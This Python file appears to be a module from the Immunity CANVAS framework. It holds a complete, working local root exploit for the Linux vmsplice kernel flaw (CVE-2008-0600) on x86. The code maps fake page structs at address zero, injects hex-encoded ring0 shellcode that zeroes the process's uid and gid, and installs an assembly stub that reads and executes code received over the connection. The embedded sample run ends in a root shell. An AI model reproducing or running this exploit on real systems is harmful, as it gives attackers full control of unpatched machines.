#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: 
    sys.path.append(".")

from exploitutils import *
from ExploitTypes.localexploit import LocalExploit
from MOSDEF import mosdef

NOTES = """
- vmsplice kernel local 2.6.17 <= 2.6.24
- pretty much a straight up MOSDEF port of the qaaz sploit-logic
- this is all specific to x86 kernel, x86_64 kernel has diff syscall #

commandline example:

Linux/MOSDEF$ runmodule vmsplice -v0
[C] Running module: vmsplice
[C] Args: -v0
Loading vmsplice ...                                                     [ ok ]
...
Run local on node ...
[C] (0.0.0.1/32) [+] setresuid/setgid result: 0x0
[C] (0.0.0.1/32) [+] uid: 1000, euid: 1000, gid: 1000, egid: 1000
[C] (0.0.0.1/32) [+] mmap result: 0x5000
[C] (0.0.0.1/32) [+] code stubs base: 5000
[C] (0.0.0.1/32) [+] mmap result: 0xb7c33000
[C] (0.0.0.1/32) [+] copied code into 5000
[C] (0.0.0.1/32) [+] copied code into 51ca
[C] (0.0.0.1/32) [+] ring0 code at: 51ca
[C] (0.0.0.1/32) [+] mmap result: 0x0
[C] (0.0.0.1/32) [+] sizeof(page_struct): 32
[C] (0.0.0.1/32) [+] copied struct into 0
[C] (0.0.0.1/32) [+] page0 struct 0 at: 0
[C] (0.0.0.1/32) [+] sizeof(page_struct): 32
[C] (0.0.0.1/32) [+] copied struct into 20
[C] (0.0.0.1/32) [+] page0 struct 1 at: 20
[C] (0.0.0.1/32) [+] mmap result: 0x4000
[C] (0.0.0.1/32) [+] sizeof(page_struct): 32
[C] (0.0.0.1/32) [+] copied struct into 4000
[C] (0.0.0.1/32) [+] page1 struct 2 at: 4000
[C] (0.0.0.1/32) [+] sizeof(page_struct): 32
[C] (0.0.0.1/32) [+] copied struct into 4020
[C] (0.0.0.1/32) [+] page1 struct 3 at: 4020
[C] (0.0.0.1/32) [+] mmap result: 0x1000
[C] (0.0.0.1/32) [+] mmap page size page at: 1000
[C] (0.0.0.1/32) [+] mmap result: 0xb7c01000
[C] (0.0.0.1/32) [+] big mmap of size 32000 at: b7c01000
[C] (0.0.0.1/32) [+] munmap result: 0
[C] (0.0.0.1/32) [+] munmapped page at: b7c31000
[C] (0.0.0.1/32) [+] signal result: 0
[C] (0.0.0.1/32) [+] pipe result: 5
[C] (0.0.0.1/32) [+] vmsplice result: cafebabe
[C] (0.0.0.1/32) [+] got root .. we like root ..
Linux/MOSDEF$ id         
uid=0(root) gid=0(root)

"""

NAME = "vmsplice"
DESCRIPTION = "vmsplice Linux Kernel local root"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Linux"
DOCUMENTATION["Date public"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2008-0600"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0600"
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION["References"]=["http://www.coseinc.com/coseinc_linux_advisory_3.pdf","https://bugs.launchpad.net/ubuntu/+source/linux-source-2.6.22/+bug/190587"]
DOCUMENTATION["Notes"]="If you run this more than once, the target will become unhappy and may close your MOSDEF connection, print an OOPS, or otherwise show abnormal behavior"
VERSION = "1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Linux",  "i386"] ]
PROPERTY['KERNELVER'] = ["2.6.17", "2.6.24.1"]

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.code_page_off = 0

    def get_args(self):
        return
    
    def install_page_struct(self, p, offset, code):
        """ places a page struct into a memory page at a given offset """
        
        vars = {'code' : code, 'codelen' : len(code), 'page' : (p + offset)}
        
        code = """
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendint" as "sendint"
        
        #import "string", "code" as "code"
        #import "int", "codelen" as "codelen"
        #import "int", "page" as "page"
        
        void
        main()
        {
            char *p;
            int ret;
            
            p = page;
            ret = memcpy(p, code, codelen);
            
            sendint(ret);
        }
        """
        
        ret = self.node.shell.runCode(code, vars)
        if ret == (p + offset):
            self.log('[+] copied struct into %x' % (p + offset))
        else:
            self.log('[-] memcpy failed')
            raise Exception, 'memcpy failed'
            
        return ret # offset adjusted

    # installs a block of code into a code page
    def install_code_stub(self, p, code):
        """ places a codestab into a memory page and adjusts offsets """

        # adjust for any existing base offset
        p += self.code_page_off
        
        vars = {'code' : code, 'codelen' : len(code), 'page' : p}
        
        code = """
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendint" as "sendint"
        
        #import "string", "code" as "code"
        #import "int", "codelen" as "codelen"
        #import "int", "page" as "page"
        
        void
        main()
        {
            char *p;
            int ret;
            
            p = page;
            ret = memcpy(p, code, codelen);
            
            sendint(ret);
        }
        """
        
        ret = self.node.shell.runCode(code, vars)
        if ret == p:
            self.log('[+] copied code into %x' % p)
            self.code_page_off += len(code)
        else:
            self.log('[-] memcpy failed')
            raise Exception, 'memcpy failed'
            
        return ret # offset adjusted
        
        
    def get_exit_code(self):
        """ returns the code stub that's triggered on the SIGPIPE post-owning with uid 0 """
        
        # in our case we just want to continue our MOSDEF loop
        # alternatively we can upload a execve replace binary
        # and have this chown/chmod it to suid root
        
        exit_code = """
        // sendint to tell exploit we succeeded :>
        pushl $0xcafebabe
        movl $FD,%ebx
        movl %esp,%ecx
        movl $4,%edx
        movl %edx,%eax
        int $0x80
 
        // 2.6 only so we can do a MAP_ANONYMOUS mmap2
        
        xorl %ebp,%ebp // we dont use ebp in the parent loop, never return
        movl $0xffffffff,%edi
        movl $34,%esi // MAP_PRIVATE | MAP_ANONYMOUS
        movl $7,%edx
        movl $0x00010000,%ecx
        xorl %ebx,%ebx
        xorl %eax,%eax
        movb $192,%al // SYS_mmap2
        int $0x80
        
        movl %eax,%edi
        
        pushl %edi // base copy
        pushl %edi // mod copy
        
    read_exec_loop:
               
        // len read
        xorl %eax,%eax
        xorl %edx,%edx
        movl $FD,%ebx
        movl %edi,%ecx
        movb $4,%dl
        movb $3,%al
        int $0x80
        
        // if eax <= 0
        test %eax,%eax
        jz exit
        cmpl $-1,%eax
        jz exit
        
        pushl (%edi) // save len
        
    read_loop:
    
        movl $FD,%ebx
        movl 4(%esp),%ecx
        movl (%esp),%edx
        xorl %eax,%eax
        movb $3,%al
        int $0x80
        
        test %eax,%eax
        jz exit
        cmpl $-1,%eax
        je exit
    
        // kludgy because mosdef still sucks at direct derefs
        movl (%esp),%ecx
        subl %eax,%ecx
        movl %ecx,(%esp)
        
        movl 4(%esp),%edi
        addl %eax,%edi
        movl %edi,4(%esp)
        
        test %ecx,%ecx
        jnz read_loop
        
    exec:
        
        popl %eax // eat len
        popl %eax // eat mod copy
        popl %eax // get base addie
        
        pushl %eax // base copy
        pushl %eax // mod copy
        
        call *%eax
        
        jmp read_exec_loop
        
    exit:
    
        xorl %eax,%eax
        xorl %ebx,%ebx
        incl %eax
        int $0x80
        """
        
        exit_code = exit_code.replace("FD", "%d" % self.node.shell.fd)
        
        return mosdef.assemble(exit_code, 'X86')
    
    def get_kernel_code(self, exit_stack, exit_code, uid, gid):
        """ searches current page and updates ustruct to set uid/gid/etc. to 0 """
        # this runs in ring0
        # qaaz getcurr + set ustruct + exit kernel
        # gcc 4.1.3
        kernel_code="\x55"+\
                    "\x89\xe5"+\
                    "\x53"+\
                    "\x83\xec\x10"+\
                    "\x89\xe0"+\
                    "\x25\x00\xe0\xff\xff"+\
                    "\x8b\x00"+\
                    "\x89\x45\xf8"+\
                    "\x8b\x45\xf8"+\
                    "\x89\x45\xf4"+\
                    "\xc7\x45\xf0\x00\x00\x00\x00"+\
                    "\xe9\x22\x01\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x8b\x10"+\
                    "UID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x0f\x85\x08\x01\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x04"+\
                    "\x8b\x10"+\
                    "UID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x0f\x85\xf3\x00\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x08"+\
                    "\x8b\x10"+\
                    "UID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x0f\x85\xde\x00\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x0c"+\
                    "\x8b\x10"+\
                    "UID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x0f\x85\xc9\x00\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x10"+\
                    "\x8b\x10"+\
                    "GID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x0f\x85\xb4\x00\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x14"+\
                    "\x8b\x10"+\
                    "GID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x0f\x85\x9f\x00\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x18"+\
                    "\x8b\x10"+\
                    "GID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x0f\x85\x8a\x00\x00\x00"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x1c"+\
                    "\x8b\x10"+\
                    "GID_TO_EAX"+\
                    "\x39\xc2"+\
                    "\x75\x79"+\
                    "\x8b\x4d\xf4"+\
                    "\x83\xc1\x04"+\
                    "\x8b\x55\xf4"+\
                    "\x83\xc2\x08"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x0c"+\
                    "\xc7\x00\x00\x00\x00\x00"+\
                    "\x8b\x00"+\
                    "\x89\x02"+\
                    "\x8b\x02"+\
                    "\x89\x01"+\
                    "\x8b\x11"+\
                    "\x8b\x45\xf4"+\
                    "\x89\x10"+\
                    "\x8b\x4d\xf4"+\
                    "\x83\xc1\x10"+\
                    "\x8b\x5d\xf4"+\
                    "\x83\xc3\x14"+\
                    "\x8b\x55\xf4"+\
                    "\x83\xc2\x18"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x1c"+\
                    "\xc7\x00\x00\x00\x00\x00"+\
                    "\x8b\x00"+\
                    "\x89\x02"+\
                    "\x8b\x02"+\
                    "\x89\x03"+\
                    "\x8b\x03"+\
                    "\x89\x01"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x24"+\
                    "\x89\x45\xf4"+\
                    "\x8b\x55\xf4"+\
                    "\x83\xc2\x04"+\
                    "\x8b\x45\xf4"+\
                    "\x83\xc0\x08"+\
                    "\xc7\x00\xff\xff\xff\xff"+\
                    "\x8b\x00"+\
                    "\x89\x02"+\
                    "\x8b\x12"+\
                    "\x8b\x45\xf4"+\
                    "\x89\x10"+\
                    "\xeb\x15"+\
                    "\x83\x45\xf4\x04"+\
                    "\x83\x45\xf0\x01"+\
                    "\x81\x7d\xf0\xf2\x03\x00\x00"+\
                    "\x0f\x8e\xd1\xfe\xff\xff"+\
                    "EXIT_STACK_EDX"+\
                    "EXIT_CODE_EAX"+\
                    "\xc7\x44\x24\x10\x7b\x00\x00"+\
                    "\x00"+\
                    "\x89\x54\x24\x0c"+\
                    "\xc7\x44\x24\x08\x46\x02\x00"+\
                    "\x00"+\
                    "\xc7\x44\x24\x04\x73\x00\x00"+\
                    "\x00"+\
                    "\x89\x04\x24"+\
                    "\xcf"+\
                    "\x83\xc4\x10"+\
                    "\x5b"+\
                    "\x5d"+\
                    "\xc3"
        
        # these shouldnt change the offsets .. assembles to len() 5
        kernel_code = kernel_code.replace("UID_TO_EAX", mosdef.assemble("movl $0x%x,%%eax" % int(uid), 'X86'))
        kernel_code = kernel_code.replace("GID_TO_EAX", mosdef.assemble("movl $0x%x,%%eax" % int(gid), 'X86'))
        
        kernel_code = kernel_code.replace("EXIT_STACK_EDX", mosdef.assemble("movl $0x%x,%%edx" % exit_stack, 'X86'))
        kernel_code = kernel_code.replace("EXIT_CODE_EAX", mosdef.assemble("movl $0x%x,%%eax" % exit_code, 'X86'))

        return kernel_code
    
    def get_page_struct(self, flags=0, count=0, mapcount=0, private=0, mapping=0, index=0, next=0, prev=0):
        """ does page struct fun """
        
        # force little endian and not native (we might be running CANVAS on be)
        page_struct = ''
        page_struct += struct.pack('<L', flags)
        page_struct += struct.pack('<L', count)
        page_struct += struct.pack('<L', mapcount)
        page_struct += struct.pack('<L', private)
        page_struct += struct.pack('<L', mapping)
        page_struct += struct.pack('<L', index)
        page_struct += struct.pack('<L', next)
        page_struct += struct.pack('<L', prev)
        
        self.log('[+] sizeof(page_struct): %d' % len(page_struct))
        return page_struct
    
    def setids_syscall(self, uid, gid):
        """ setresuid/setresgid """
        
        vars = {'uid' : uid, 'gid' : gid}
        
        vars['SYS_setresuid'] = 164
        vars['SYS_setresgid'] = 170
        
        code = """
        #import "local", "syscall3" as "syscall3"
        #import "local", "sendint" as "sendint"
        
        #import "int", "uid" as "uid"
        #import "int", "gid" as "gid"
        
        #import "int", "SYS_setresuid" as "SYS_setresuid"
        #import "int", "SYS_setresgid" as "SYS_setresgid"
        
        void
        main()
        {
            int ret;
            
            ret = syscall3(SYS_setresuid, uid, uid, uid);
            ret = syscall3(SYS_setresgid, gid, gid, gid);
            
            sendint(ret);
        }
        """
        
        ret = self.node.shell.runCode(code, vars)
        self.log('[+] setresuid/setgid result: 0x%x' % ret)
        
        return ret
    
    def vmsplice_syscall(self, fd, iov_base, iov_len, nr_segs, flags):
        vars = { 'SYS_vmsplice' : 316 } # intel x86
        
        # args
        vars['fd'] = fd
        vars['nr_segs'] = nr_segs
        vars['flags'] = flags
        
        # iovec struct
        vars['iov_base'] = iov_base
        vars['iov_len'] = iov_len
        
        code = """
        // long vmsplice(int fd, const struct iovec *io, unsigned long nr_segs, unsigned int flags);
        
        #import "local", "syscall4" as "syscall4"
        #import "local", "sendint" as "sendint"
        
        #import "int", "SYS_vmsplice" as "SYS_vmsplice"
        
        #import "int", "fd" as "fd"
        #import "int", "nr_segs" as "nr_segs"
        #import "int", "flags" as "flags"

        #import "int", "iov_base" as "iov_base"
        #import "int", "iov_len" as "iov_len"
        
        struct iovec 
        {
             void  * iov_base; // Starting address
             int iov_len; // Number of bytes
        }; 
            
        void
        main()
        {
            struct iovec io;
            int ret;
            
            // init io struct with muck here
            io.iov_base = iov_base;
            io.iov_len = iov_len;
            
            // do the call
            ret = syscall4(SYS_vmsplice, fd, &io, nr_segs, flags);

            // if success .. this sendint is replaced
            // by the exit_code sendint of 0xcafebabe
            // SIGPIPE prevents this sendint from happening
            // so the actual return value actually comes
            // from the exit_code stub ;)
            //
            // HOWEVER .. you still wanna make sure the pipe
            // is clean due to SIGPIPE buffering semantics ..
            sendint(ret);
        }
        """
        
        ret = self.node.shell.runCode(code, vars)
        self.log('[+] vmsplice result: %x' % ret)
        
        return ret
    
    def get_pagesize(self):
        """ returns pagesize """
        return self.node.shell.getpagesize()
    
    def munmap_syscall(self, p, p_len):
        """ do munmap """
        vars = {'SYS_munmap' : 91, 'p' : p, 'p_len' : p_len }
        code = """
        #import "local", "syscall2" as "syscall2"
        #import "local", "sendint" as "sendint"
        
        #import "int", "SYS_munmap" as "SYS_munmap"
        #import "int", "p" as "p"
        #import "int", "p_len" as "p_len"
        
        void
        main()
        {
            char *page;
            int ret;
            page = p;
            ret = syscall2(SYS_munmap, page, p_len);
            sendint(ret);
        }
        """
        ret = self.node.shell.runCode(code, vars)
        self.log('[+] munmap result: %x' % ret)
        return ret
    
    def pipe_syscall(self):
        """ do pipe """

        vars = {}
        code = """
        #import "local", "pipe" as "pipe"
        #import "local", "close" as "close"
        #import "local", "sendint" as "sendint"
        
        void
        main()
        {
            int pi[2];
            int ret;
            ret = pipe(pi);
            close(pi[0]);
            if (ret < 0)
            {
                sendint(ret);
            }
            else
            {
                sendint(pi[1]);
            }
        }
        """

        ret = self.node.shell.runCode(code, vars)
        self.log('[+] pipe result: %x' % ret)
        
        return ret
    
    def signal_syscall(self, sig, handler):
        """ install signal handler with exit code fp """
        
        vars = { 'sig' : sig, 'handler' : handler }
        
        code = """
        #import "local", "signal" as "signal"
        #import "local", "sendint" as "sendint"
        
        #import "int", "handler" as "handler"
        #import "int", "sig" as "sig"
        
        void
        main()
        {
            int ret;
            ret = signal(sig, handler);
            sendint(ret);
        }
        """
        
        ret = self.node.shell.runCode(code, vars)
        self.log('[+] signal result: %x' % ret)
        
        return ret
    
    def mmap_syscall(self, mma, size, fixed=True):
        """ do mmap fun """
        
        PROT_EXEC = self.node.shell.libc.getdefine('PROT_EXEC')
        PROT_READ = self.node.shell.libc.getdefine('PROT_READ')
        PROT_WRITE = self.node.shell.libc.getdefine('PROT_WRITE')
        MAP_PRIVATE = self.node.shell.libc.getdefine('MAP_PRIVATE')
        MAP_ANONYMOUS = self.node.shell.libc.getdefine('MAP_ANONYMOUS')
        MAP_FIXED = self.node.shell.libc.getdefine('MAP_FIXED')
        MAP_FAILED = self.node.shell.libc.getdefine('MAP_FAILED')

        if fixed == True:
            flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED
        else:
            flags = MAP_PRIVATE | MAP_ANONYMOUS
        
        p = self.node.shell.mmap(uint32(mma),\
                                 size,\
                                 PROT_READ | PROT_WRITE | PROT_EXEC,\
                                 flags,\
                                 -1,\
                                 0)

        self.log('[+] mmap result: 0x%x (flags: %x)' % (uint32(p), flags))
        self.node.shell.memset(uint32(p), 0, size)
        
        return uint32(p)
    
    def mmap_test(self):
        MAP_FAILED = self.node.shell.libc.getdefine('MAP_FAILED')
        for p in [0, 0x4000, 0x1000, 0xb7fa4000]:
            p = self.mmap_syscall(p, self.page_size)
            if p == MAP_FAILED:
                print 'mmap: failed'
        return 0
    
    def vmsplice_exploit(self):
        """ main exploit logic lulz """

        # make sure we know what creds look like in u_struct
        (uid,euid,gid,egid) = self.node.shell.ids()
        self.setids_syscall(uid, gid)
        
        self.log('[+] uid: %d, euid: %d, gid: %d, egid: %d' % (uid, euid, gid, egid))
                
        # get page size
        self.page_size = self.get_pagesize()
        
        # get some lulz room for our code stubs
        code_base = self.mmap_syscall(0x5000, self.page_size)
        self.log('[+] code stubs base: %x' % code_base)
        
        # get an exit stack
        exit_stack = self.mmap_syscall(0, 1024*1024, fixed=False)
        exit_stack = exit_stack + 1024*1024 # set stack top
        
        # get fp to exit code SIGPIPE handler
        exit_code = self.install_code_stub(code_base, self.get_exit_code())
        
        # get kernel code ptr
        kernel_code_ptr = self.install_code_stub(code_base, self.get_kernel_code(exit_stack, exit_code, uid, gid))
        self.log('[+] ring0 code at: %x' % kernel_code_ptr)
        
        # install the first page struct (compound page) set at page 0 (0x0)
        
        # by controlling the page[1].lru.next ptr we control the destructor
        # for put_compound_page() .. thus getting convenient code execution
        
        COMPOUND_PAGE=14
        page0_mmap = self.mmap_syscall(0, self.page_size) # map compound page struct pair at 0
        pstr0_ptr = self.install_page_struct(page0_mmap, 0,\
            self.get_page_struct(flags=(1 << COMPOUND_PAGE),\
                                 private=page0_mmap,\
                                 count=1,\
                             )\
        )
        self.log('[+] page0 struct 0 at: %x' % pstr0_ptr)
        pstr1_ptr = self.install_page_struct(page0_mmap, 32,\
            self.get_page_struct(next=kernel_code_ptr,\
                             )\
        )
        self.log('[+] page0 struct 1 at: %x' % pstr1_ptr)
        
        # install the second page struct set at page 1
        page1_mmap = self.mmap_syscall(1 << COMPOUND_PAGE, self.page_size) # map compound page struct pair at 0x4000
        pstr2_ptr = self.install_page_struct(page1_mmap, 0,\
            self.get_page_struct(flags=(1 << COMPOUND_PAGE),\
                                 private=page1_mmap,\
                                 count=1,\
                             )\
        )
        self.log('[+] page1 struct 0 at: %x' % pstr2_ptr)
        pstr3_ptr = self.install_page_struct(page1_mmap, 32,\
            self.get_page_struct(next=kernel_code_ptr,\
                             )\
        )
        self.log('[+] page1 struct 1 at: %x' % pstr3_ptr)
        
        # considering we have overwrite with 0/PAGE_SIZE pairs we want both to be mapped
        page2_mmap = self.mmap_syscall(self.page_size, self.page_size)
        self.log('[+] mmap page size page at: %x' % page2_mmap) 

        PIPE_BUFFERS = 16
        page3_size = (PIPE_BUFFERS * 3 + 2) * self.page_size
        page3_mmap = self.mmap_syscall(0, page3_size, fixed=False)
        self.log('[+] big mmap of size %x at: %x' % (page3_size, page3_mmap))
    
        page3_size -= 2 * self.page_size
        self.munmap_syscall(page3_mmap + page3_size, self.page_size)
        self.log('[+] munmapped page at: %x' % (uint32(page3_mmap) + page3_size))
        
        # install signal handler(s) .. also do SIGSEGV in case we crash post-uid setting
        SIGPIPE = self.node.shell.libc.getdefine('SIGPIPE')
        self.signal_syscall(SIGPIPE, exit_code)
        
        #/* Maximum value an `unsigned long int' can hold.  (Minimum is 0.)  */
        #  if __WORDSIZE == 64
        #   define ULONG_MAX    18446744073709551615UL
        #  else
        #   define ULONG_MAX    4294967295UL
        #  endif

        # pipe syscall
        fd = self.pipe_syscall()
        if fd < 0:
            print '[-] pipe failed ...'
            return 0
        
        # vmsplice syscall explained
        #
        # by setting iov_len to ULONG_MAX .. trigger a wraparound in
        # npages = (off + len + PAGE_SIZE - 1) >> PAGE_SHIFT;
        # where off == 0, PAGE_SIZE =- 0x1000 and PAGE_SHIFT == 12
        # 
        # we make npages 0 pass check at: if (npages > PIPE_BUFFERS - buffers)
        # get_user_pages then returns > PIPE_BUFFERS from the big mmap
        # space at page3_mmap.
        #
        # In the code that follows there's a partial[] array that is filled.
        # We overflow with 0x0/0x1000 pairs behind partial[PIPE_BUFFERS]
        # pages[PIPE_BUFFERS] lives behind partial .. so we overwrite
        # page ptrs with 0x0 and 0x1000 .. we map 0x0/0x1000 to be valid
        # mem and place compound page structs at 0, page[1].lru.next
        # is used as a destructor in put_compound_page() and takes
        # us to controlled kernel code execution .. this is called like:
        #
        # dtor = (void (*)(struct page *))page[1].lru.next; dtor(page);
        
        # io_base == big mmap > sufficient # of pages to overflow what we want
        # to hit .. and io_len == ULONG_MAX to make npages end up as 0
        
        ret = self.vmsplice_syscall(fd, page3_mmap, 4294967295L, 1, 0)
        
        return ret
    
    def run(self):
        """ This run happens on all nodes selected """
        self.setInfo("%s (in progress)" % (NAME))
        self.get_args()
        
        for node in self.argsDict["passednodes"]:
            
            type = node.nodetype
            nodename = node.getname()
            caps = node.capabilities
            
            if "linux" not in caps:
                self.log("Node %s not a Linux node..." % nodename)
                continue
            else:
                print "Run local on node ..."
                self.node = node
                ret = self.vmsplice_exploit()
                if ret == 0xcafebabe: # as sent by exit_code
                    self.log('[+] got root .. we like root ..')
                    self.log('[+] making sure pipe is clean ..')
                    try:
                        clean = node.shell.connection.recv(4)
                        self.log('[+] got leftover: %s' % repr(clean))
                    except:
                        pass
                    self.log('[+] cleaned the pipe ;)')

                    self.log('[!] resetting SIG_PIPE handler to SIG_IGN ..')
                    SIGPIPE = node.shell.libc.getdefine('SIGPIPE')
                    SIG_IGN = node.shell.libc.getdefine('SIG_IGN')
                    node.shell.signal(SIGPIPE, SIG_IGN)
                    self.log('[+] all done .. spiffy ..')

                    self.setInfo("%s (Succeeded)" % (NAME))
                    return 1

        self.setInfo("%s (Failed)" % (NAME))
        return 0

if __name__=="__main__":
    print "This module is meant to be run only within CANVAS"
    
